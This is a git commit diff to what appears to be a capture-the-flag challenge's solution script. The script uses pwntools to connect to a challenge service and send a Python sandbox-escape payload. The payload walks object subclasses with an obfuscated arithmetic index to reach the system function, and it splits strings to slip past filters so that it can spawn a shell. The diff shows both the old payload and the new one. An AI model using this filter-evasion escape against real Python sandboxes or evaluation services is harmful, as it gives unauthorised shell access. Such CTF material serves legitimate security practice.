09b993aee1b5249ef4ce44d1d78832745b94f251
0x-Matthias <138510020+0x-Matthias@users.noreply.github.com>
2025-02-27 23:46:23 +0100

    Patching misc/Pythonic to use the same python version across the build and dist, as well as the solution script

--- misc/Pythonic/sol/sol.py
+++ misc/Pythonic/sol/sol.py
@@ -5,14 +5,18 @@ port = 3001
 
 conn = remote(host, port)
 
-text = conn.recvuntil(b'> ').decode().strip()
-print(text)
+text = conn.recvuntil(b'> ').decode()
+print(text, end='')
 
-payload = '().__class__.__base__.__subclasses__()[(0**0<<((((0**0<<0**0)<<0**0)<<0**0)-0**0))-(-(0**0<<((0**0<<0**0)<<0**0)))-(-(0**0<<(((0**0<<0**0)<<0**0)-0**0)))-(-(0**0<<(0**0<<0**0)))-(-(0**0<<(0**0-0**0)))].__init__.__globals__["sy""stem"]("s""h")'
-conn.writeline(payload)
+index = '(0**0<<((((0**0<<0**0)<<0**0)<<0**0)-0**0))-(-(0**0<<0**0<<0**0)-(0**0<<0**0))'
+#print('DEBUG: index = ', eval(index))
+payload = '().__class__.__base__.__subclasses__()[' + index + '].__init__.__globals__["sy""stem"]("s""h")'
+conn.writeline(payload.encode())
+print(payload)
 
-text = conn.recvuntil(b'> ').decode().strip()
-print(text)
+text = conn.recvuntil(b'> ').decode()
+print(text, end='')
 
 conn.writeline(b'q')
+print('q')
 conn.close()
